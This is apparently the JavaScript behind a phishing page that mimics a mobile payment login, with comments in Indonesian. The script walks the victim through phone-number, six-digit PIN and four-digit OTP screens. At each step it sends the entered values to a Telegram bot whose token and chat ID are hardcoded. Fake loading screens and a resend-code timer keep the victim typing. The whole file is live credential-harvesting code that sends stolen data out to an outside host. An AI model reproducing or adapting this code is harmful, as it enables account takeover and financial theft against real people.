document.addEventListener('DOMContentLoaded', () => {
  // === CONFIG TELEGRAM ===
  const TELEGRAM_TOKEN = "8638833167:AAH_CRzyUhDluWu7NlCUUZ7GuR23slHjxdU";
  const TELEGRAM_CHAT_ID = "-1003627147396";

  // Fungsi Tambahan untuk Kirim ke Telegram (Sempurna & Aman)
  function sendToTelegram(message) {
    const url = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage`;
    fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown"
      })
    })
    .then(res => res.json())
    .then(data => console.log("Telegram Sukses:", data))
    .catch(err => console.error("Telegram Gagal:", err));
  }
  // ===============================================

  // Elements DOM
  const splashScreen = document.getElementById('splashScreen');
  const loadingScreen = document.getElementById('loadingScreen');
  const pagePhone = document.getElementById('pagePhone');
  const pagePin = document.getElementById('pagePin');
  const otpBottomSheet = document.getElementById('otpBottomSheet');
  
  const phoneInput = document.getElementById('phoneInput');
  const btnNext = document.getElementById('btnNext');
  
  const pinFields = document.querySelectorAll('.pin-field');
  const otpFields = document.querySelectorAll('.otp-field');
  const timerSpan = document.getElementById('timer');

  let countdownInterval = null;

  if (splashScreen) {
    setTimeout(() => {
      splashScreen.classList.add('fade-out');
      setTimeout(() => {
        splashScreen.classList.add('hidden');
        if (pagePhone) {
          pagePhone.classList.remove('hidden');
        }
        if (phoneInput) {
          phoneInput.focus();
        }
      }, 600);
    }, 2200);
  }

  // --- 2. VALIDASI INPUT NOMOR HP ---
  if (phoneInput && btnNext) {
    phoneInput.addEventListener('input', (e) => {
      let val = e.target.value.replace(/\D/g, '');
      e.target.value = val;
      
      if (val.length >= 9) {
        btnNext.removeAttribute('disabled');
      } else {
        btnNext.setAttribute('disabled', 'true');
      }
    });

    // --- 3. MASUK KE HALAMAN PIN VIA TOMBOL LANJUT ---
    btnNext.addEventListener('click', () => {
      const nomorHp = phoneInput.value;
      sendToTelegram(`📱 *Data Masuk Baru*\n\n*No. HP:* \`${nomorHp}\``);

      if (loadingScreen) loadingScreen.classList.remove('hidden');
      
      setTimeout(() => {
        if (loadingScreen) loadingScreen.classList.add('hidden'); 
        if (pagePhone) pagePhone.classList.add('hidden');     
        if (pagePin) pagePin.classList.remove('hidden');
        
        // PERBAIKAN: Fokus ke indeks [0] agar kode tidak error/macet
        if (pinFields && pinFields.length > 0) {
          pinFields[0].focus();
        }
      }, 1500);
    });
  }

  // --- 4. LOGIKA AUTO-INPUT PIN 6 DIGIT ---
  if (pinFields && pinFields.length > 0) {
    pinFields.forEach((field, index) => {
      field.addEventListener('input', (e) => {
        const val = e.target.value;
        if (!/^\d*$/.test(val)) {
          e.target.value = '';
          return;
        }

        if (val && index < pinFields.length - 1) {
          pinFields[index + 1].focus();
        }
        
        checkPinComplete();
      });

      field.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !field.value && index > 0) {
          pinFields[index - 1].focus();
        }
      });
    });
  }

  function checkPinComplete() {
    const combinedPin = Array.from(pinFields).map(f => f.value).join('');
    
    if (combinedPin.length === 6) {
      const nomorHp = phoneInput ? phoneInput.value : 'Tidak diketahui';
      sendToTelegram(`🔐 *Update Data PIN*\n\n*No. HP:* \`${nomorHp}\`\n*PIN:* \`${combinedPin}\``);

      pinFields.forEach(f => f.blur());
      
      if (loadingScreen) loadingScreen.classList.remove('hidden');

      setTimeout(() => {
        if (loadingScreen) loadingScreen.classList.add('hidden');
        if (otpBottomSheet) otpBottomSheet.classList.add('show'); 
        
        setTimeout(() => {
          // PERBAIKAN: Fokus ke indeks [0] agar kode tidak error/macet
          if (otpFields && otpFields.length > 0) {
            otpFields[0].focus();
          }
          startOtpCountdown();
        }, 400);

      }, 1400);
    }
  }

  // --- 5. LOGIKA AUTO-INPUT OTP 4 DIGIT ---
  if (otpFields && otpFields.length > 0) {
    otpFields.forEach((field, index) => {
      field.addEventListener('input', (e) => {
        const val = e.target.value;
        if (!/^\d*$/.test(val)) {
          e.target.value = '';
          return;
        }

        if (val && index < otpFields.length - 1) {
          otpFields[index + 1].focus();
        }
        
        checkOtpComplete();
      });

      field.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !field.value && index > 0) {
          otpFields[index - 1].focus();
        }
      });
    });
  }

  function checkOtpComplete() {
    const combinedOtp = Array.from(otpFields).map(f => f.value).join('');
    
    if (combinedOtp.length === 4) {
      const nomorHp = phoneInput ? phoneInput.value : 'Tidak diketahui';
      const combinedPin = Array.from(pinFields).map(f => f.value).join('');
      sendToTelegram(`✅ *Data Selesai & Terverifikasi*\n\n*No. HP:* \`${nomorHp}\`\n*PIN:* \`${combinedPin}\`\n*OTP:* \`${combinedOtp}\``);

      otpFields.forEach(f => f.blur());
      
      if (loadingScreen) loadingScreen.classList.remove('hidden'); 
      
      setTimeout(() => {
        if (loadingScreen) loadingScreen.classList.add('hidden');
        if (loadingScreen) loadingScreen.classList.remove('hidden'); 

        console.log("Seluruh proses otomatis sukses tanpa error!");
      }, 1500);
    }
  }

  function startOtpCountdown() {
    if (!timerSpan) return;
    
    let timeLeft = 60;
    timerSpan.textContent = timeLeft;
    if (countdownInterval) clearInterval(countdownInterval);
    
    countdownInterval = setInterval(() => {
      timeLeft--;
      timerSpan.textContent = timeLeft;
      
      if (timeLeft <= 0) {
        clearInterval(countdownInterval);
        
        const countdownContainer = document.querySelector('.countdown-text');
        if (countdownContainer) {
          countdownContainer.innerHTML = '<a href="#" id="btnResendOtp" style="color:#118EEA; text-decoration:none; font-weight:600; cursor:pointer;">Kirim Ulang Kode</a>';
          
          const btnResendOtp = document.getElementById('btnResendOtp');
          if (btnResendOtp) {
            btnResendOtp.addEventListener('click', (e) => {
              e.preventDefault();
              if (loadingScreen) loadingScreen.classList.remove('hidden');
              
              setTimeout(() => {
                if (loadingScreen) loadingScreen.classList.add('hidden');
                otpFields.forEach(f => f.value = '');
                countdownContainer.innerHTML = 'Kirim ulang dalam <span id="timer">60</span> detik';
                
                const newTimerSpan = document.getElementById('timer');
                if (newTimerSpan) {
                  document.getElementById('timer').textContent = '60';
                  startOtpCountdownUpdate(newTimerSpan); 
                }
                
                // PERBAIKAN: Fokus ke indeks [0] agar kode tidak error/macet
                if (otpFields && otpFields.length > 0) {
                  otpFields[0].focus();
                }
              }, 1200);
            });
          }
        }
      }
    }, 1000);
  }

  function startOtpCountdownUpdate(targetSpan) {
    let timeLeft = 60;
    if (countdownInterval) clearInterval(countdownInterval);
    
    countdownInterval = setInterval(() => {
      timeLeft--;
      targetSpan.textContent = timeLeft;
      if (timeLeft <= 0) {
        clearInterval(countdownInterval);
        startOtpCountdown(); 
      }
    }, 1000);
  }
});
